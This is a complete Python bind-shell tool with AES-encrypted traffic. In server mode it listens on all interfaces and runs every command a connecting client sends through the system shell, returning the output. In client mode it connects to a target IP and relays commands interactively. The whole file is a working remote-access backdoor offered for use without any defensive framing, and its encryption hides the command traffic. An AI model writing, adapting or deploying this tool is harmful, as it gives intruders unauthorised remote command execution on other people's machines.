import socket
import subprocess
import threading
import argparse
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import time

# Global Variables
DEFAULT_PORT = 9999
DEFAULT_MAX_CLIENTS = 5
active_clients = set()


# AES Encryption/Decryption class
class AESCipher:
    def __init__(self, key):
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key, AES.MODE_ECB)

    def encrypt(self, data):
        return self.cipher.encrypt(pad(data, AES.block_size)).hex()   
    
    def decrypt(self, data):
        return unpad(self.cipher.decrypt(bytes.fromhex(data)), AES.block_size)
    
    def __str__(self):
        return "AES Key --> {}".format(self.key.hex())  

# Helper functions for large data handling
def send_large_data(sock, data):
    chunk_size = 4096
    total_length = len(data)
    sock.sendall(total_length.to_bytes(4, 'big'))
    
    for i in range(0, total_length, chunk_size):
        sock.sendall(data[i:i + chunk_size])

def receive_large_data(sock):
    total_length = int.from_bytes(sock.recv(4), 'big')
    chunks = []
    bytes_received = 0
    
    while bytes_received < total_length:
        chunk = sock.recv(min(total_length - bytes_received, 4096))
        if not chunk:
            raise ConnectionError("Socket connection broken")
        chunks.append(chunk)
        bytes_received += len(chunk)
    
    return b''.join(chunks)

# Encrypt and send data
def encrypt_send(sock, data):
    encrypted_data = cipher.encrypt(data)
    send_large_data(sock, encrypted_data.encode('latin-1'))

# Receive and decrypt data
def decrypt_receive(sock):
    encrypted_data = receive_large_data(sock).decode('latin-1')
    return cipher.decrypt(encrypted_data)

# Execute shell command and return output
def execute_command(command):
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as e:
        output = e.output
    except Exception as e:
        output = str(e).encode('latin-1')
    return output

# Handle client connection
def handle_client(client_socket):
    try:
        encrypt_send(client_socket, b'[ -- Connected -- ]')
        while True:
            encrypt_send(client_socket, b'\nEnter command: \n')
            command = decrypt_receive(client_socket).decode('latin-1')
            
            if command:
                buffer = command.strip()
            
            if not buffer or buffer.lower() == 'exit':
                print("Client disconnected.")
                break

            print("> Executing command: " + buffer)
            result = execute_command(buffer)
            encrypt_send(client_socket, result)

    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()
        active_clients.remove(client_socket)
        print(f"Client disconnected. Active clients: {len(active_clients)}")

# Send data to the server
def send_data(sock):
    try:
        while True:
            data = input() + '\n'
            encrypt_send(sock, data.encode('latin-1'))
    
    except Exception as e:
        print(f"Error: {e}")
        sock.close()

# Receive data from the server
def recv_data(sock):
    try:
        while True:
            data = decrypt_receive(sock).decode('latin-1')
            if data:
                print("\n" + data, end="", flush=True)
    
    except Exception as e:
        print(f"Error: {e}")
        sock.close()

# Bind shell server     
def server(port, max_clients):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", port))
    server_socket.listen()

    print(f"\n--- Bind Shell Server Started ---\nListening on port {port} with a max of {max_clients} clients...\n")

    while True:
        client_socket, addr = server_socket.accept()

        if len(active_clients) >= max_clients:
            print(f"Maximum client limit reached ({max_clients}). Sending 'full capacity' message.")
            encrypt_send(client_socket, b'[ -- Server Full -- ]')
            client_socket.close()
            continue

        print(f"New Client Connected from {addr[0]}:{addr[1]}")
        
        active_clients.add(client_socket)
        print(f"Active clients: {len(active_clients)}")
        
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()

# Bind shell client
def client(ip, port):
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((ip, port))

            print(f"\nConnecting to Bind Shell server at {ip}:{port}")
            print("Bind shell client starting\n")

            # Check the initial server message
            server_message = decrypt_receive(client_socket).decode('latin-1')
            if server_message == '[ -- Server Full -- ]':
                print("Server is full. Waiting for a slot to become available...")
                client_socket.close()
                time.sleep(5)  # Wait before retrying
                continue  # Retry connection
            elif server_message.startswith('[ -- Connected -- ]'):
                print("Successfully connected to the server.")

            send_thread = threading.Thread(target=send_data, args=(client_socket,))
            send_thread.start()

            recv_thread = threading.Thread(target=recv_data, args=(client_socket,))
            recv_thread.start()

            break  # Exit loop if connection is successful

        except ConnectionRefusedError:
            print(f"Server at {ip}:{port} is unreachable. Retrying in 5 seconds...")
            time.sleep(5)  # Wait before retrying

# Setting up argparse
parser = argparse.ArgumentParser(
    description='Encrypted Bind Shell: A tool to create a secure bind shell server or client with AES encryption.'
)

# Adding arguments
parser.add_argument(
    '-t', '--target',
    help='IP address of the target server (required in client mode)',
    type=str
)

parser.add_argument(
    '-p', '--port',
    help='Port number to use (default: 9999)',
    type=int,
    default=DEFAULT_PORT,
    metavar='PORT'
)

parser.add_argument(
    '-c', '--clients',
    help='Maximum number of simultaneous clients (default: 5)',
    type=int,
    default=DEFAULT_MAX_CLIENTS,
    metavar='NUM_CLIENTS'
)

parser.add_argument(
    '-s', '--server',
    help='Run in server mode',
    action='store_true'
)

parser.add_argument(
    '-k', '--key',
    help='AES encryption key in hexadecimal format (64 characters for 256-bit key)',
    type=str,
    metavar='AES_Key'
)

args = parser.parse_args()

if args.target and not args.key: 
    print("Error: AES key must be provided for target mode")
    exit(0)

if args.key:
    cipher = AESCipher(bytes.fromhex(args.key))
else:
    cipher = AESCipher(None)

print(f"Using cipher: {cipher}")

#store the maximum number of clients
max = args.clients

if args.server:
    server(args.port, max )
else:
    if not args.target:
        print("Error: Target IP address must be provided for client mode")
        exit(0)
    client(args.target, args.port)
